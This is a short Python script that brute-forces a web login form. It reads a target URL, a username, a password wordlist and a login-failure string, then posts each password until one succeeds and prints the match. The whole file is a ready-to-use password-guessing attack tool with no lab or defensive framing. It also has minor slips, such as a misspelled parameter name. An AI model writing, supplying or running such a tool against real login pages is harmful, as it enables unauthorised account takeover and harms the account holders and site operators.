import requests
from termcolor import colored 

url = input("Enter Page URL: ")
username = input("Enter Username for the Account to Bruteforce: " )
password_file = input("Enter password file to use: ")
login_failed_string = input("Enter String that occurs when Login Fails: ")

def cracking(usename,url):
    for password in passwords:
        password = password.strip()
        print(colored(("Trying: " + password), "red"))
        data = {"username":username, "password":password, "Login":"submit"}
        response = requests.post(url, data=data)
        if login_failed_string in response.content.decode():
            pass
        else:
            print(colored(("Found Combination: " + usename + password), "green"))
            exit()

with open(password_file, "r") as passwords:
    cracking(username,url)

print("Password not Found")